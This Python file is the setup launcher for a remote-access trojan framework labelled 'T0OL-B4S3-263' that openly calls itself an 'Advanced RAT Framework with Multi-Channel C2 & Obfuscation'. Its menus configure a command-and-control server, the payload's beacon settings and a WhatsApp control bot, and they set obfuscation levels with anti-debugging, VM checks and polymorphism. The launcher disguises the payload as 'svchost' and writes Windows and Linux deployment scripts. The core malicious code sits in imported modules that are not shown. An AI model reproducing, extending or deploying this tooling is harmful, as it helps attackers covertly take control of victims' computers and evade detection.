#!/usr/bin/env python3
"""
T0OL-B4S3-263 INTEGRATED SETUP LAUNCHER
Combines setup_master.py and setup_advanced.py for complete project configuration
"""

import sys
import os
from pathlib import Path
from typing import Dict, List

# Import our setup modules
sys.path.insert(0, str(Path(__file__).parent))

try:
    from setup_master import MasterSetup, TerminalStyle, InteractivePrompt
    from setup_advanced import (
        SessionDatabase, MultiChannelC2Config, ObfuscationConfig,
        PayloadCustomization, ConnectivityTester, DeploymentHelper,
        CommandTemplates
    )
except ImportError as e:
    print(f"Error importing setup modules: {e}")
    sys.exit(1)


class IntegratedSetupLauncher:
    """Main launcher integrating all setup components"""
    
    def __init__(self):
        self.style = TerminalStyle()
        self.prompt = InteractivePrompt()
        self.config = {}
        self.db = None
        
    def display_banner(self):
        """Display beautiful startup banner"""
        banner = """
        ╔══════════════════════════════════════════════════════════════════╗
        ║                   T0OL-B4S3-263 Setup Launcher                    ║
        ║                  Integrated Configuration System                  ║
        ║                                                                  ║
        ║  Advanced RAT Framework with Multi-Channel C2 & Obfuscation      ║
        ╚══════════════════════════════════════════════════════════════════╝
        """
        print(self.style.color(banner, 'bright_cyan'))
    
    def main_menu(self) -> str:
        """Display main menu"""
        print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
        print(self.style.bold("║       T0OL-B4S3-263 SETUP LAUNCHER       ║"))
        print(self.style.bold("╚════════════════════════════════════════╝"))
        
        color_map = {
            'blue': 'bright_blue',
            'green': 'bright_green',
            'yellow': 'bright_yellow',
            'magenta': 'bright_magenta',
            'cyan': 'bright_cyan',
            'red': 'bright_red',
            'white': 'white'
        }
        
        options = [
            ("1", "Quick Setup (All Components)", "blue"),
            ("2", "Basic Configuration Only", "green"),
            ("3", "Advanced C2 Configuration", "yellow"),
            ("4", "Payload Obfuscation Setup", "magenta"),
            ("5", "Database Initialization", "cyan"),
            ("6", "Deploy & Test", "red"),
            ("7", "View Configuration Summary", "white"),
            ("8", "Exit", "white")
        ]
        
        for key, label, color in options:
            colored_label = self.style.color(label, color_map.get(color, 'white'))
            print(f"  {key}. {colored_label}")
        
        choice = input("\n" + self.style.color("Select option: ", 'bright_cyan')).strip()
        return choice
    
    def setup_basic(self):
        """Run basic configuration"""
        print("\n" + self.style.color("Starting Basic Configuration Setup...", 'bright_yellow'))
        
        print("\n" + self.style.bold("═" * 50))
        print(self.style.bold("C2 SERVER CONFIGURATION"))
        print(self.style.bold("═" * 50))
        
        c2_host = self.prompt.prompt_text(
            "C2 Server Host",
            default="0.0.0.0"
        )
        c2_port = self.prompt.prompt_text(
            "C2 Server Port",
            default="5000"
        )
        
        self.config['c2'] = {
            'host': c2_host,
            'port': int(c2_port)
        }
        
        print("\n" + self.style.bold("═" * 50))
        print(self.style.bold("PAYLOAD CONFIGURATION"))
        print(self.style.bold("═" * 50))
        
        target_host = self.prompt.prompt_text(
            "Target C2 Host (what payload connects to)",
            default=c2_host
        )
        target_port = self.prompt.prompt_text(
            "Target C2 Port",
            default=c2_port
        )
        
        self.config['payload'] = {
            'c2Host': target_host,
            'c2Port': int(target_port),
            'beaconInterval': 30
        }
        
        print("\n" + self.style.bold("═" * 50))
        print(self.style.bold("WHATSAPP BOT CONFIGURATION"))
        print(self.style.bold("═" * 50))
        
        admin_number = self.prompt.prompt_text(
            "Administrator Phone Number",
            default="+1234567890"
        )
        
        self.config['whatsapp'] = {
            'adminNumber': admin_number,
            'c2Host': c2_host,
            'c2Port': int(c2_port)
        }
        
        print("\n" + self.style.color("✓ Basic configuration complete!", 'bright_green'))
    
    def setup_advanced_c2(self):
        """Setup multi-channel C2"""
        print("\n" + self.style.color("Advanced C2 Configuration", 'bright_yellow'))
        
        mc2 = MultiChannelC2Config()
        
        print("\nAvailable channels:")
        for ch_name, ch_info in mc2.AVAILABLE_CHANNELS.items():
            status = self.style.color("●", 'bright_green') if ch_name == 'https_direct' else self.style.color("●", 'bright_red')
            print(f"  {status} {ch_name}: {ch_info['name']}")
            print(f"     {ch_info['description']}")
            print(f"     Risk: {ch_info['detection_risk']}, Speed: {ch_info['speed']}\n")
        
        primary = self.prompt.prompt_choice(
            "Primary channel",
            list(mc2.AVAILABLE_CHANNELS.keys()),
            default=0
        )
        mc2.config['primary'] = primary
        
        print("\nConfigure HTTPS Direct channel:")
        https_host = self.prompt.prompt_text("HTTPS Host", default="c2.example.com")
        https_port = self.prompt.prompt_text("HTTPS Port", default="443")
        
        mc2.configure_channel('https_direct', {
            'host': https_host,
            'port': int(https_port),
            'use_ssl': True,
            'certificate_validation': False
        })
        
        print("\n" + self.style.color("✓ Multi-channel C2 configured!", 'bright_green'))
        self.config['c2_advanced'] = mc2.get_config()
    
    def setup_obfuscation(self):
        """Setup payload obfuscation"""
        print("\n" + self.style.color("Payload Obfuscation Configuration", 'bright_yellow'))
        
        obf = ObfuscationConfig()
        
        print("\nObfuscation Levels:")
        print("  1. Minimal   - Only string encoding")
        print("  2. Normal    - String + control flow + debug checks")
        print("  3. Aggressive- Add dead code, VM checks, polymorphism")
        print("  4. Maximum   - All techniques enabled")
        
        levels = ['minimal', 'normal', 'aggressive', 'maximum']
        choice = self.prompt.prompt_choice(
            "Select obfuscation level",
            [l.capitalize() for l in levels],
            default=2
        )
        
        obf.set_level(levels[choice])
        
        print("\n" + self.style.color("Payload Appearance:", 'bold'))
        fake_name = self.prompt.prompt_text(
            "Fake executable name (no extension)",
            default="svchost"
        )
        
        custom = PayloadCustomization()
        custom.config['name'] = fake_name
        
        print("\n" + self.style.color("✓ Obfuscation configured!", 'bright_green'))
        self.config['obfuscation'] = obf.config
        self.config['payload_custom'] = custom.get_config()
    
    def init_database(self):
        """Initialize SQLite database"""
        print("\n" + self.style.color("Initializing Session Database...", 'bright_yellow'))
        
        db_path = self.prompt.prompt_text(
            "Database path",
            default="sessions.db"
        )
        
        try:
            self.db = SessionDatabase(db_path)
            print(self.style.color(f"✓ Database initialized at {db_path}", 'bright_green'))
            self.config['database'] = {'path': db_path}
        except Exception as e:
            print(self.style.color(f"✗ Database initialization failed: {e}", 'bright_red'))
    
    def deploy_and_test(self):
        """Deploy and test configuration"""
        print("\n" + self.style.color("Deployment & Testing", 'bright_yellow'))
        
        if not self.config:
            print(self.style.color("No configuration loaded! Run Basic Setup first.", 'bright_red'))
            return
        
        if 'c2' in self.config:
            print(f"\nTesting C2 connectivity to {self.config['c2']['host']}:{self.config['c2']['port']}...")
            
            tester = ConnectivityTester(
                self.config['c2']['host'],
                self.config['c2']['port']
            )
            
            results = tester.run_all_tests()
            
            dns_ok = self.style.color("✓", 'bright_green') if results.get('dns_resolution') else self.style.color("✗", 'bright_red')
            c2_ok = self.style.color("✓", 'bright_green') if results.get('c2_connectivity') else self.style.color("✗", 'bright_red')
            
            print(f"  DNS Resolution: {dns_ok}")
            print(f"  C2 Connectivity: {c2_ok}")
        
        if self.config:
            print("\nGenerating deployment scripts...")
            deployer = DeploymentHelper(Path.cwd())
            
            ps_script = deployer.generate_deployment_script(self.config)
            bash_script = deployer.generate_bash_deployment(self.config)
            
            with open('deploy_windows.ps1', 'w') as f:
                f.write(ps_script)
            print(self.style.color("✓ Generated deploy_windows.ps1", 'bright_green'))
            
            with open('deploy_linux.sh', 'w') as f:
                f.write(bash_script)
            print(self.style.color("✓ Generated deploy_linux.sh", 'bright_green'))
    
    def show_summary(self):
        """Display configuration summary"""
        if not self.config:
            print(self.style.color("No configuration loaded!", 'bright_red'))
            return
        
        print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
        print(self.style.bold("║   CONFIGURATION SUMMARY                  ║"))
        print(self.style.bold("╚════════════════════════════════════════╝"))
        
        print(self.style.color("\n[C2 Server]", 'bright_cyan'))
        if 'c2' in self.config:
            print(f"  Host: {self.style.color(self.config['c2']['host'], 'bright_green')}")
            print(f"  Port: {self.style.color(str(self.config['c2']['port']), 'bright_green')}")
        
        print(self.style.color("\n[Payload]", 'bright_cyan'))
        if 'payload' in self.config:
            print(f"  Target: {self.style.color(self.config['payload']['c2Host'], 'bright_green')}")
            print(f"  Port: {self.style.color(str(self.config['payload']['c2Port']), 'bright_green')}")
            print(f"  Beacon Interval: {self.style.color('30s', 'bright_green')}")
        
        print(self.style.color("\n[Obfuscation]", 'bright_cyan'))
        if 'obfuscation' in self.config:
            print(f"  Level: {self.style.color(self.config['obfuscation']['level'].upper(), 'bright_green')}")
            enabled = len(self.config['obfuscation']['enabled_techniques'])
            print(f"  Techniques: {self.style.color(str(enabled), 'bright_green')}")
        
        print(self.style.color("\n[Database]", 'bright_cyan'))
        if 'database' in self.config:
            print(f"  Path: {self.style.color(self.config['database']['path'], 'bright_green')}")
        
        print("\n" + self.style.bold("═" * 42))
    
    def run(self):
        """Main launcher loop"""
        self.display_banner()
        
        while True:
            choice = self.main_menu()
            
            if choice == "1":
                self.setup_basic()
                self.setup_advanced_c2()
                self.setup_obfuscation()
                self.init_database()
            elif choice == "2":
                self.setup_basic()
            elif choice == "3":
                self.setup_advanced_c2()
            elif choice == "4":
                self.setup_obfuscation()
            elif choice == "5":
                self.init_database()
            elif choice == "6":
                self.deploy_and_test()
            elif choice == "7":
                self.show_summary()
            elif choice == "8":
                print(self.style.color("Exiting T0OL-B4S3-263 Setup Launcher...", 'bright_cyan'))
                sys.exit(0)
            else:
                print(self.style.color("Invalid option!", 'bright_red'))


if __name__ == '__main__':
    launcher = IntegratedSetupLauncher()
    launcher.run()
